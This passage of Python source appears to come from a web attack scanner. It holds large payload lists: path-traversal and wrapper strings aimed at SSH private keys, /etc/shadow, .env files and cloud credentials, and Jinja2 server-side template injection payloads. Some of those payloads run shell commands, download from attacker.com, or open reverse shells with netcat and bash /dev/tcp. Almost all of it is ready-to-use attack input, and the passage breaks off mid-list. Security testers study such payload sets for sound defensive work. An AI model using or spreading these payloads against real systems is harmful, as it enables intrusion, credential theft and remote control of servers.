        '/var/lib/pgsql/data/postgresql.conf',
        '/var/lib/pgsql/data/PG_VERSION',
        '/var/lib/pgsql/data/base/',
        '/var/lib/pgsql/data/global/pg_control',
        '/var/lib/pgsql/data/pg_xlog/',
        '/var/lib/postgresql/data/pg_hba.conf',
        '/var/lib/postgresql/data/pg_ident.conf',
        '/var/lib/postgresql/data/postgresql.conf',
        '/var/lib/postgresql/data/PG_VERSION',
        '/etc/postgresql/*/main/pg_hba.conf',
        '/etc/postgresql/*/main/postgresql.conf',
        '/etc/postgresql/*/main/pg_ident.conf',
        '/var/log/postgresql/postgresql.log',
        '/var/log/postgresql/postgresql-*.log',
        '/var/log/mysql/mysql.log',
        '/var/log/mysql/mysql.err',
        '/var/log/mysql/mysql-slow.log',
        '/var/log/mysql/error.log',
        
        # ==================== 651-700: SSH & SSL KEYS ====================
        '/etc/ssh/ssh_host_key',
        '/etc/ssh/ssh_host_key.pub',
        '/etc/ssh/ssh_host_rsa_key',
        '/etc/ssh/ssh_host_rsa_key.pub',
        '/etc/ssh/ssh_host_dsa_key',
        '/etc/ssh/ssh_host_dsa_key.pub',
        '/etc/ssh/ssh_host_ecdsa_key',
        '/etc/ssh/ssh_host_ecdsa_key.pub',
        '/etc/ssh/ssh_host_ed25519_key',
        '/etc/ssh/ssh_host_ed25519_key.pub',
        '/etc/ssh/ssh_config',
        '/etc/ssh/sshd_config',
        '/etc/ssh/moduli',
        '/root/.ssh/id_rsa',
        '/root/.ssh/id_rsa.pub',
        '/root/.ssh/id_dsa',
        '/root/.ssh/id_dsa.pub',
        '/root/.ssh/id_ecdsa',
        '/root/.ssh/id_ecdsa.pub',
        '/root/.ssh/id_ed25519',
        '/root/.ssh/id_ed25519.pub',
        '/root/.ssh/authorized_keys',
        '/root/.ssh/known_hosts',
        '/root/.ssh/config',
        '/home/*/.ssh/id_rsa',
        '/home/*/.ssh/id_rsa.pub',
        '/home/*/.ssh/id_dsa',
        '/home/*/.ssh/id_dsa.pub',
        '/home/*/.ssh/id_ecdsa',
        '/home/*/.ssh/id_ecdsa.pub',
        '/home/*/.ssh/id_ed25519',
        '/home/*/.ssh/id_ed25519.pub',
        '/home/*/.ssh/authorized_keys',
        '/home/*/.ssh/known_hosts',
        '/home/*/.ssh/config',
        '/var/www/.ssh/id_rsa',
        '/var/www/.ssh/id_rsa.pub',
        '/var/www/.ssh/authorized_keys',
        '/etc/ssl/private/ssl-cert-snakeoil.key',
        '/etc/ssl/private/ssl-cert-snakeoil.key.pem',
        '/etc/ssl/private/ssl-cert-snakeoil.pem',
        '/etc/ssl/certs/ssl-cert-snakeoil.pem',
        '/etc/ssl/private/ssl.key',
        '/etc/ssl/private/ssl.crt',
        '/etc/ssl/private/ssl.pem',
        '/etc/ssl/private/server.key',
        '/etc/ssl/private/server.crt',
        '/etc/ssl/private/server.pem',
        '/etc/pki/tls/private/localhost.key',
        '/etc/pki/tls/private/localhost.crt',
        '/etc/pki/tls/certs/localhost.crt',
        '/usr/local/etc/ssl/private/server.key',
        '/usr/local/etc/ssl/certs/server.crt',
        
        # ==================== 701-750: APPLICATION FILES ====================
        '/var/www/html/wp-config.php',
        '/var/www/html/wp-config-sample.php',
        '/var/www/html/wp-settings.php',
        '/var/www/html/wp-admin/setup-config.php',
        '/var/www/html/wp-content/plugins/',
        '/var/www/html/wp-content/themes/',
        '/var/www/html/wp-content/uploads/',
        '/var/www/html/wp-includes/version.php',
        '/var/www/html/.wp-cli/config.yml',
        '/var/www/html/license.txt',
        '/var/www/html/readme.html',
        '/var/www/html/xmlrpc.php',
        '/var/www/html/error_log',
        '/var/www/html/error.log',
        '/var/www/html/debug.log',
        '/var/www/html/log.txt',
        '/var/www/html/logs/error.log',
        '/var/www/html/logs/access.log',
        '/var/www/html/tmp/error.log',
        '/var/www/html/tmp/session_*',
        '/var/www/html/cache/',
        '/var/www/html/cache/config.php',
        '/var/www/html/cache/data.json',
        '/var/www/html/app/config/parameters.yml',
        '/var/www/html/app/config/parameters.ini',
        '/var/www/html/app/config/parameters.json',
        '/var/www/html/app/config/config.yml',
        '/var/www/html/app/config/config_dev.yml',
        '/var/www/html/app/config/config_prod.yml',
        '/var/www/html/app/config/security.yml',
        '/var/www/html/app/config/routing.yml',
        '/var/www/html/app/config/services.yml',
        '/var/www/html/app/bootstrap.php.cache',
        '/var/www/html/app/cache/dev/annotations',
        '/var/www/html/app/cache/dev/classes.map',
        '/var/www/html/app/cache/prod/annotations',
        '/var/www/html/app/cache/prod/classes.map',
        '/var/www/html/app/logs/dev.log',
        '/var/www/html/app/logs/prod.log',
        '/var/www/html/app/logs/test.log',
        '/var/www/html/.env',
        '/var/www/html/.env.local',
        '/var/www/html/.env.dev',
        '/var/www/html/.env.prod',
        '/var/www/html/.env.test',
        '/var/www/html/.env.example',
        '/var/www/html/.env.sample',
        '/var/www/html/Dockerfile',
        '/var/www/html/docker-compose.yml',
        '/var/www/html/docker-compose.yaml',
        '/var/www/html/Makefile',
        '/var/www/html/Procfile',
        '/var/www/html/requirements.txt',
        
        # ==================== 751-800: COMPRESSED WRAPPERS ====================
        'zip:///var/www/html/backup.zip#index.php',
        'zip:///var/www/html/backup.zip#/var/www/html/index.php',
        'zip:///var/www/html/backup.zip#../../etc/passwd',
        'zip:///var/www/html/backup.zip#../etc/passwd',
        'zip:///tmp/upload.zip#shell.php',
        'zip:///tmp/upload.zip#../shell.php',
        'zip:///var/www/html/uploads/archive.zip#file.txt',
        'zip://../../../../var/www/html/backup.zip#index.php',
        'zip://../../../etc/passwd.zip#passwd',
        'phar:///var/www/html/archive.phar#index.php',
        'phar:///var/www/html/archive.phar#/var/www/html/index.php',
        'phar:///var/www/html/archive.phar#../../etc/passwd',
        'phar:///var/www/html/archive.phar#../etc/passwd',
        'phar:///tmp/upload.phar#shell.php',
        'phar:///tmp/upload.phar#../shell.php',
        'phar:///var/www/html/uploads/archive.phar#file.txt',
        'phar://../../../../var/www/html/archive.phar#index.php',
        'phar://../../../etc/passwd.phar#passwd',
        'bzip2:///var/www/html/archive.bz2#index.php',
        'bzip2:///tmp/upload.bz2#shell.php',
        'bzip2://../../../../etc/passwd.bz2#passwd',
        'zlib:///var/www/html/archive.gz#index.php',
        'zlib:///tmp/upload.gz#shell.php',
        'zlib://../../../../etc/passwd.gz#passwd',
        'rar:///var/www/html/archive.rar#index.php',
        'rar:///tmp/upload.rar#shell.php',
        'rar://../../../../etc/passwd.rar#passwd',
        'ogg:///var/www/html/audio.ogg#index.php',
        'ogg:///tmp/audio.ogg#shell.php',
        'compress.zlib:///var/www/html/backup.gz',
        'compress.bzip2:///var/www/html/backup.bz2',
        'compress.zlib://../../../etc/passwd.gz',
        'compress.bzip2://../../../etc/passwd.bz2',
        'phar:///var/www/html/backup.phar/index.php',
        'phar:///var/www/html/backup.phar/../index.php',
        'phar:///var/www/html/backup.phar/../../index.php',
        'phar:///var/www/html/backup.phar/../../../index.php',
        'phar:///var/www/html/backup.phar/../../../../index.php',
        'zip:///var/www/html/backup.zip%00index.php',
        'phar:///var/www/html/archive.phar%00index.php',
        'zip:///var/www/html/backup.zip%23index.php',
        'phar:///var/www/html/archive.phar%23index.php',
        'zip:///var/www/html/backup.zip%3Findex.php',
        'phar:///var/www/html/archive.phar%3Findex.php',
        'zip:///var/www/html/backup.zip;index.php',
        'phar:///var/www/html/archive.phar;index.php',
        'zip:///var/www/html/backup.zip|index.php',
        'phar:///var/www/html/archive.phar|index.php',
        'compress.zlib:///var/www/html/backup.gz/index.php',
        'compress.bzip2:///var/www/html/backup.bz2/index.php',
        
        # ==================== 801-850: DOUBLE & TRIPLE TRAVERSAL ====================
        '....//....//....//etc/passwd',
        '....//....//....//....//etc/passwd',
        '....//....//....//....//....//etc/passwd',
        '....//....//....//....//....//....//etc/passwd',
        '....////....////....////etc/passwd',
        '....////....////....////....////etc/passwd',
        '....////....////....////....////....////etc/passwd',
        '.../.../.../etc/passwd',
        '.../.../.../.../etc/passwd',
        '.../.../.../.../.../etc/passwd',
        '.../.../.../.../.../.../etc/passwd',
        '..//..//..//etc/passwd',
        '..//..//..//..//etc/passwd',
        '..//..//..//..//..//etc/passwd',
        '..//..//..//..//..//..//etc/passwd',
        './//.///.///etc/passwd',
        './//.///.///.///etc/passwd',
        './//.///.///.///.///etc/passwd',
        '../.../../.../../.../etc/passwd',
        '../.../../.../../.../../.../etc/passwd',
        '../.../../.../../.../../.../../.../etc/passwd',
        '..;/..;/..;/etc/passwd',
        '..;/..;/..;/..;/etc/passwd',
        '..;/..;/..;/..;/..;/etc/passwd',
        '..;/..;/..;/..;/..;/..;/etc/passwd',
        '..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\..\\etc\\passwd',
        '..\\..\\..\\..\\..\\..\\etc\\passwd',
        '..\\\\..\\\\..\\\\etc\\\\passwd',
        '..\\\\..\\\\..\\\\..\\\\etc\\\\passwd',
        '..\\\\..\\\\..\\\\..\\\\..\\\\etc\\\\passwd',
        '..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\etc\\\\passwd',
        '..\\../..\\../..\\/etc/passwd',
        '..\\../..\\../..\\/..\\/etc/passwd',
        '..\\../..\\../..\\/..\\/..\\/etc/passwd',
        '..;/\\../;\\/../;\\/etc/passwd',
        '..;/\\../;\\/../;\\/../;\\/etc/passwd',
        '..;/\\../;\\/../;\\/../;\\/../;\\/etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        
        # ==================== 851-900: ADDITIONAL SYSTEM FILES ====================
        '/etc/default/useradd',
        '/etc/default/passwd',
        '/etc/default/group',
        '/etc/default/shadow',
        '/etc/login.defs',
        '/etc/adduser.conf',
        '/etc/pam.d/common-auth',
        '/etc/pam.d/common-password',
        '/etc/pam.d/common-session',
        '/etc/pam.d/sshd',
        '/etc/pam.d/login',
        '/etc/pam.d/sudo',
        '/etc/security/limits.conf',
        '/etc/security/namespace.conf',
        '/etc/security/console.perms',
        '/etc/security/console.perms.d',
        '/etc/security/group.conf',
        '/etc/security/access.conf',
        '/etc/security/pam_env.conf',
        '/etc/security/time.conf',
        '/etc/security/opasswd',
        '/etc/security/sepermit.conf',
        '/etc/selinux/config',
        '/etc/selinux/targeted/contexts/files/file_contexts',
        '/etc/apparmor.d/',
        '/etc/apparmor/',
        '/etc/apparmor/parser.conf',
        '/etc/apparmor/subdomain.conf',
        '/etc/logrotate.conf',
        '/etc/logrotate.d/',
        '/etc/rsyslog.conf',
        '/etc/rsyslog.d/',
        '/etc/syslog.conf',
        '/etc/syslog-ng/syslog-ng.conf',
        '/etc/audit/auditd.conf',
        '/etc/audit/audit.rules',
        '/etc/audit/rules.d/',
        '/etc/rc.local',
        '/etc/rc.d/rc.local',
        '/etc/init.d/',
        '/etc/init/',
        '/etc/systemd/system/',
        '/etc/systemd/system/multi-user.target.wants/',
        '/etc/systemd/system/sockets.target.wants/',
        '/etc/systemd/system/timers.target.wants/',
        '/etc/systemd/system/network-online.target.wants/',
        '/etc/systemd/system/remote-fs.target.wants/',
        '/etc/rc0.d/',
        '/etc/rc1.d/',
        '/etc/rc2.d/',
        '/etc/rc3.d/',
        '/etc/rc4.d/',
        '/etc/rc5.d/',
        '/etc/rc6.d/',
        '/etc/rcS.d/',
        
        # ==================== 901-950: ENVIRONMENT & CONFIG FILES ====================
        '/proc/self/cwd/.env',
        '/proc/self/cwd/.env.local',
        '/proc/self/cwd/.env.dev',
        '/proc/self/cwd/.env.prod',
        '/proc/self/cwd/.env.test',
        '/proc/self/cwd/.env.example',
        '/proc/self/cwd/.env.sample',
        '/proc/self/cwd/.git/config',
        '/proc/self/cwd/.git/HEAD',
        '/proc/self/cwd/.git/index',
        '/proc/self/cwd/.git/logs/HEAD',
        '/proc/self/cwd/.git/refs/heads/master',
        '/proc/self/cwd/.git/refs/remotes/origin/HEAD',
        '/proc/self/cwd/.git/objects/',
        '/proc/self/cwd/.svn/entries',
        '/proc/self/cwd/.svn/wc.db',
        '/proc/self/cwd/.hg/hgrc',
        '/proc/self/cwd/.hg/requires',
        '/proc/self/cwd/.bzr/README',
        '/proc/self/cwd/.bzr/branch/last-revision',
        '/proc/self/cwd/composer.json',
        '/proc/self/cwd/composer.lock',
        '/proc/self/cwd/package.json',
        '/proc/self/cwd/package-lock.json',
        '/proc/self/cwd/yarn.lock',
        '/proc/self/cwd/Gemfile',
        '/proc/self/cwd/Gemfile.lock',
        '/proc/self/cwd/requirements.txt',
        '/proc/self/cwd/Pipfile',
        '/proc/self/cwd/Pipfile.lock',
        '/proc/self/cwd/poetry.lock',
        '/proc/self/cwd/setup.py',
        '/proc/self/cwd/Makefile',
        '/proc/self/cwd/Dockerfile',
        '/proc/self/cwd/docker-compose.yml',
        '/proc/self/cwd/docker-compose.yaml',
        '/proc/self/cwd/Procfile',
        '/proc/self/cwd/.travis.yml',
        '/proc/self/cwd/.circleci/config.yml',
        '/proc/self/cwd/.github/workflows/',
        '/proc/self/cwd/.gitlab-ci.yml',
        '/proc/self/cwd/.drone.yml',
        '/proc/self/cwd/Jenkinsfile',
        '/proc/self/cwd/.envrc',
        '/proc/self/cwd/terraform.tfstate',
        '/proc/self/cwd/terraform.tfvars',
        '/proc/self/cwd/ansible.cfg',
        '/proc/self/cwd/ansible/inventory',
        '/proc/self/cwd/ansible/playbook.yml',
        '/proc/self/cwd/kubeconfig',
        '/proc/self/cwd/.kube/config',
        
        # ==================== 951-1000: FINAL COVERAGE ====================
        '../../../etc/passwd?',
        '../../../etc/passwd#',
        '../../../etc/passwd;',
        '../../../etc/passwd:',
        '../../../etc/passwd|',
        '../../../etc/passwd&',
        '../../../etc/passwd$',
        '../../../etc/passwd`',
        '../../../etc/passwd"',
        '../../../etc/passwd\'',
        '../../../etc/passwd\\',
        '../../../etc/passwd/',
        '../../../etc/passwd/.',
        '../../../etc/passwd/..',
        '../../../etc/passwd/../',
        '../../../etc/passwd/./',
        '../../../etc/passwd/.../',
        '../../../etc/passwd/../../',
        '../../../etc/passwd/../../../',
        '../../../etc/passwd/../../../../',
        'file:///etc/passwd',
        'file:///etc/passwd/',
        'file://../../../etc/passwd',
        'file://../../../../etc/passwd',
        'file:///var/www/html/index.php',
        'file:///var/www/html/wp-config.php',
        'file:///C:/windows/win.ini',
        'file:///C:/windows/system32/drivers/etc/hosts',
        'file:///proc/self/environ',
        'file:///proc/self/cmdline',
        'file:///var/log/apache2/access.log',
        'file:///var/log/nginx/access.log',
        'file:///var/log/httpd/access_log',
        'file:///var/log/auth.log',
        'file:///var/log/secure',
        'file:///etc/shadow',
        'file:///etc/gshadow',
        'file:///etc/hostname',
        'file:///etc/hosts',
        'file:///etc/resolv.conf',
        'file:///etc/fstab',
        'file:///etc/mtab',
        'file:///etc/crontab',
        'file:///etc/ssh/sshd_config',
        'file:///etc/php/php.ini',
        'file:///etc/apache2/apache2.conf',
        'file:///etc/nginx/nginx.conf',
        'file:///etc/mysql/my.cnf',
        'file:///root/.ssh/id_rsa',
        'file:///home/*/.ssh/id_rsa',
        'file:///var/www/html/.env',
    ]

    # ─── SSTI Payloads — 50+ vectors for all engines ──────────────────────
    SSTI_PAYLOADS = [
        # ==================== 1-50: JINJA2 / FLASK - BASIC ====================
        ('{{7*7}}', 'Jinja2 Math 49'),
        ('{{7*7}}', 'Jinja2 Math 49'),
        ('{{7+7}}', 'Jinja2 Addition 14'),
        ('{{7-7}}', 'Jinja2 Subtraction 0'),
        ('{{7/7}}', 'Jinja2 Division 1'),
        ('{{7%7}}', 'Jinja2 Modulo 0'),
        ('{{7**7}}', 'Jinja2 Power 823543'),
        ('{{7<<7}}', 'Jinja2 Bit Shift 896'),
        ('{{7>>7}}', 'Jinja2 Bit Shift 0'),
        ('{{7|7}}', 'Jinja2 Bit OR 7'),
        ('{{7&7}}', 'Jinja2 Bit AND 7'),
        ('{{7^7}}', 'Jinja2 Bit XOR 0'),
        ('{{~7}}', 'Jinja2 Bit NOT -8'),
        ('{{"7"*7}}', 'Jinja2 String Repeat 7777777'),
        ('{{"7"+"7"}}', 'Jinja2 String Concat 77'),
        ('{{config}}', 'Jinja2 Config Object'),
        ('{{config.items()}}', 'Jinja2 Config Items'),
        ('{{config.keys()}}', 'Jinja2 Config Keys'),
        ('{{config.values()}}', 'Jinja2 Config Values'),
        ('{{config.__dict__}}', 'Jinja2 Config Dict'),
        ('{{config.__class__}}', 'Jinja2 Config Class'),
        ('{{config.__class__.__name__}}', 'Jinja2 Config Class Name'),
        ('{{config.__class__.__mro__}}', 'Jinja2 Config MRO'),
        ('{{config.__class__.__bases__}}', 'Jinja2 Config Bases'),
        ('{{config.__class__.__init__}}', 'Jinja2 Config Init'),
        ('{{config.__class__.__init__.__globals__}}', 'Jinja2 Config Init Globals'),
        ('{{self}}', 'Jinja2 Self'),
        ('{{self.__class__}}', 'Jinja2 Self Class'),
        ('{{self.__class__.__mro__}}', 'Jinja2 Self MRO'),
        ('{{self.__class__.__bases__}}', 'Jinja2 Self Bases'),
        ('{{self.__class__.__init__}}', 'Jinja2 Self Init'),
        ('{{self.__class__.__init__.__globals__}}', 'Jinja2 Self Init Globals'),
        ('{{request}}', 'Jinja2 Request'),
        ('{{request.__class__}}', 'Jinja2 Request Class'),
        ('{{request.__class__.__mro__}}', 'Jinja2 Request MRO'),
        ('{{request.__class__.__bases__}}', 'Jinja2 Request Bases'),
        ('{{request.__class__.__init__}}', 'Jinja2 Request Init'),
        ('{{request.__class__.__init__.__globals__}}', 'Jinja2 Request Init Globals'),
        ('{{request.application}}', 'Jinja2 Request Application'),
        ('{{request.application.__class__}}', 'Jinja2 Request App Class'),
        ('{{request.application.__self__}}', 'Jinja2 Request App Self'),
        ('{{request.application.__self__._get_data_for_json}}', 'Jinja2 Request JSON'),
        ('{{request.application.__self__._get_data_for_json.__globals__}}', 'Jinja2 Request JSON Globals'),
        ('{{request.args}}', 'Jinja2 Request Args'),
        ('{{request.form}}', 'Jinja2 Request Form'),
        ('{{request.cookies}}', 'Jinja2 Request Cookies'),
        ('{{request.headers}}', 'Jinja2 Request Headers'),
        ('{{request.environ}}', 'Jinja2 Request Environ'),
        ('{{request.remote_addr}}', 'Jinja2 Request IP'),
        ('{{request.user_agent}}', 'Jinja2 Request UA'),
        ('{{request.method}}', 'Jinja2 Request Method'),
        
        # ==================== 51-150: JINJA2 - MRO & SUBCLASSES ====================
        ("{{''.__class__}}", 'Jinja2 Empty String Class'),
        ("{{''.__class__.__name__}}", 'Jinja2 Empty String Class Name'),
        ("{{''.__class__.__mro__}}", 'Jinja2 Empty String MRO'),
        ("{{''.__class__.__mro__[0]}}", 'Jinja2 MRO Index 0'),
        ("{{''.__class__.__mro__[1]}}", 'Jinja2 MRO Index 1'),
        ("{{''.__class__.__mro__[2]}}", 'Jinja2 MRO Index 2'),
        ("{{''.__class__.__mro__[3]}}", 'Jinja2 MRO Index 3'),
        ("{{''.__class__.__mro__[4]}}", 'Jinja2 MRO Index 4'),
        ("{{''.__class__.__mro__[5]}}", 'Jinja2 MRO Index 5'),
        ("{{''.__class__.__mro__[6]}}", 'Jinja2 MRO Index 6'),
        ("{{''.__class__.__mro__[7]}}", 'Jinja2 MRO Index 7'),
        ("{{''.__class__.__mro__[8]}}", 'Jinja2 MRO Index 8'),
        ("{{''.__class__.__mro__[9]}}", 'Jinja2 MRO Index 9'),
        ("{{''.__class__.__mro__[1].__subclasses__()}}", 'Jinja2 Subclasses from MRO1'),
        ("{{''.__class__.__mro__[2].__subclasses__()}}", 'Jinja2 Subclasses from MRO2'),
        ("{{''.__class__.__mro__[1].__subclasses__()|length}}", 'Jinja2 Subclass Count'),
        ("{{''.__class__.__mro__[1].__subclasses__()[0]}}", 'Jinja2 Subclass 0'),
        ("{{''.__class__.__mro__[1].__subclasses__()[1]}}", 'Jinja2 Subclass 1'),
        ("{{''.__class__.__mro__[1].__subclasses__()[2]}}", 'Jinja2 Subclass 2'),
        ("{{''.__class__.__mro__[1].__subclasses__()[3]}}", 'Jinja2 Subclass 3'),
        ("{{''.__class__.__mro__[1].__subclasses__()[4]}}", 'Jinja2 Subclass 4'),
        ("{{''.__class__.__mro__[1].__subclasses__()[10]}}", 'Jinja2 Subclass 10'),
        ("{{''.__class__.__mro__[1].__subclasses__()[20]}}", 'Jinja2 Subclass 20'),
        ("{{''.__class__.__mro__[1].__subclasses__()[30]}}", 'Jinja2 Subclass 30'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40]}}", 'Jinja2 Subclass 40'),
        ("{{''.__class__.__mro__[1].__subclasses__()[50]}}", 'Jinja2 Subclass 50'),
        ("{{''.__class__.__mro__[1].__subclasses__()[100]}}", 'Jinja2 Subclass 100'),
        ("{{''.__class__.__mro__[1].__subclasses__()[150]}}", 'Jinja2 Subclass 150'),
        ("{{''.__class__.__mro__[1].__subclasses__()[200]}}", 'Jinja2 Subclass 200'),
        ("{{''.__class__.__mro__[1].__subclasses__()[250]}}", 'Jinja2 Subclass 250'),
        ("{{[].__class__.__mro__[1].__subclasses__()}}", 'Jinja2 List Subclasses'),
        ("{{{}.__class__.__mro__[1].__subclasses__()}}", 'Jinja2 Dict Subclasses'),
        ("{{().__class__.__mro__[1].__subclasses__()}}", 'Jinja2 Tuple Subclasses'),
        ("{{[].__class__.__base__.__subclasses__()}}", 'Jinja2 List Base Subclasses'),
        ("{{[].__class__.__bases__[0].__subclasses__()}}", 'Jinja2 List Bases Subclasses'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]}}", 'Jinja2 List Bases Subclass 40'),
        ("{{[].__class__.__bases__[0].__subclasses__()[60]}}", 'Jinja2 List Bases Subclass 60'),
        ("{{[].__class__.__bases__[0].__subclasses__()[80]}}", 'Jinja2 List Bases Subclass 80'),
        ("{{[].__class__.__bases__[0].__subclasses__()[100]}}", 'Jinja2 List Bases Subclass 100'),
        ("{{[].__class__.__bases__[0].__subclasses__()[120]}}", 'Jinja2 List Bases Subclass 120'),
        ("{{[].__class__.__bases__[0].__subclasses__()[140]}}", 'Jinja2 List Bases Subclass 140'),
        ("{{[].__class__.__bases__[0].__subclasses__()[160]}}", 'Jinja2 List Bases Subclass 160'),
        ("{{[].__class__.__bases__[0].__subclasses__()[180]}}", 'Jinja2 List Bases Subclass 180'),
        ("{{[].__class__.__bases__[0].__subclasses__()[200]}}", 'Jinja2 List Bases Subclass 200'),
        ("{{[].__class__.__bases__[0].__subclasses__()[300]}}", 'Jinja2 List Bases Subclass 300'),
        ("{{[].__class__.__bases__[0].__subclasses__()[400]}}", 'Jinja2 List Bases Subclass 400'),
        ("{{[].__class__.__bases__[0].__subclasses__()[500]}}", 'Jinja2 List Bases Subclass 500'),
        ("{{[].__class__.__bases__[0].__subclasses__()[600]}}", 'Jinja2 List Bases Subclass 600'),
        ("{{[].__class__.__bases__[0].__subclasses__()[700]}}", 'Jinja2 List Bases Subclass 700'),
        ("{{[].__class__.__bases__[0].__subclasses__()[800]}}", 'Jinja2 List Bases Subclass 800'),
        
        # ==================== 151-250: JINJA2 - RCE PAYLOADS ====================
        ("{{ cycler.__init__.__globals__.os.popen('id').read() }}", 'Jinja2 Cycler RCE'),
        ("{{ cycler.__init__.__globals__.os.popen('whoami').read() }}", 'Jinja2 Cycler Whoami'),
        ("{{ cycler.__init__.__globals__.os.popen('ls').read() }}", 'Jinja2 Cycler LS'),
        ("{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }}", 'Jinja2 Cycler Cat'),
        ("{{ cycler.__init__.__globals__.os.popen('pwd').read() }}", 'Jinja2 Cycler PWD'),
        ("{{ joiner.__init__.__globals__.os.popen('id').read() }}", 'Jinja2 Joiner RCE'),
        ("{{ joiner.__init__.__globals__.os.popen('whoami').read() }}", 'Jinja2 Joiner Whoami'),
        ("{{ joiner.__init__.__globals__.os.popen('ls').read() }}", 'Jinja2 Joiner LS'),
        ("{{ joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}", 'Jinja2 Joiner Cat'),
        ("{{ namespace.__init__.__globals__.os.popen('id').read() }}", 'Jinja2 Namespace RCE'),
        ("{{ namespace.__init__.__globals__.os.popen('whoami').read() }}", 'Jinja2 Namespace Whoami'),
        ("{{ namespace.__init__.__globals__.os.popen('ls -la').read() }}", 'Jinja2 Namespace LS'),
        ("{{ lipsum.__globals__.os.popen('id').read() }}", 'Jinja2 Lipsum RCE'),
        ("{{ lipsum.__globals__.os.popen('whoami').read() }}", 'Jinja2 Lipsum Whoami'),
        ("{{ lipsum.__globals__.os.popen('cat /etc/passwd').read() }}", 'Jinja2 Lipsum Cat'),
        ("{{ lipsum.__globals__['os'].popen('id').read() }}", 'Jinja2 Lipsum Dict RCE'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", 'Jinja2 Config RCE'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}", 'Jinja2 Config Whoami'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}", 'Jinja2 Config LS'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}", 'Jinja2 Config Cat'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com').read() }}", 'Jinja2 Config Curl'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('wget http://attacker.com/shell.php').read() }}", 'Jinja2 Config Wget'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('nc -e /bin/sh attacker.com 4444').read() }}", 'Jinja2 Config Netcat'),
        ("{{ config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"').read() }}", 'Jinja2 Config Reverse Shell'),
        ("{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", 'Jinja2 Self Builtins RCE'),
        ("{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}", 'Jinja2 Self Builtins Whoami'),
        ("{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}", 'Jinja2 Self Builtins Cat'),
        ("{{ request.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", 'Jinja2 Request Builtins RCE'),
        ("{{ request.application.__self__._get_data_for_json.__globals__.__builtins__.__import__('os').popen('id').read() }}", 'Jinja2 Request Chain RCE'),
        ("{{ request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')() }}", 'Jinja2 Filter Chain RCE'),
        ("{{ request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('whoami')|attr('read')() }}", 'Jinja2 Filter Chain Whoami'),
        ("{{ request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('cat /etc/passwd')|attr('read')() }}", 'Jinja2 Filter Chain Cat'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}", 'Jinja2 FileReader Class'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').readlines()}}", 'Jinja2 FileReader Readlines'),
        ("{{''.__class__.__mro__[1].__subclasses__()[60]('/etc/passwd').read()}}", 'Jinja2 FileReader Alt'),
        ("{{''.__class__.__mro__[1].__subclasses__()[80]('/etc/passwd').read()}}", 'Jinja2 FileReader Alt2'),
        ("{{''.__class__.__mro__[1].__subclasses__()[100]('/etc/passwd').read()}}", 'Jinja2 FileReader Alt3'),
        ("{{''.__class__.__mro__[1].__subclasses__()[120]('/etc/passwd').read()}}", 'Jinja2 FileReader Alt4'),
        ("{{''.__class__.__mro__[1].__subclasses__()[140]('/etc/passwd').read()}}", 'Jinja2 FileReader Alt5'),
        ("{{''.__class__.__mro__[1].__subclasses__()[160]('/etc/passwd').read()}}", 'Jinja2 FileReader Alt6'),
        ("{{''.__class__.__mro__[1].__subclasses__()[180]('/etc/passwd').read()}}", 'Jinja2 FileReader Alt7'),
        ("{{''.__class__.__mro__[1].__subclasses__()[200]('/etc/passwd').read()}}", 'Jinja2 FileReader Alt8'),
        ("{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}", 'Jinja2 FileReader 40'),
        ("{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", 'Jinja2 FileReader MRO2'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}", 'Jinja2 List Base FileReader'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('C:\\windows\\win.ini').read()}}", 'Jinja2 Windows FileReader'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('C:\\Windows\\System32\\drivers\\etc\\hosts').read()}}", 'Jinja2 Windows Hosts'),
        ("{{[].__class__.__bases__[0].__subclasses__()[40]('C:\\inetpub\\wwwroot\\web.config').read()}}", 'Jinja2 Web Config'),
        
        # ==================== 251-300: JINJA2 - ADVANCED TECHNIQUES ====================
        ("{{''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['popen']('id').read()}}", 'Jinja2 FileReader Popen'),
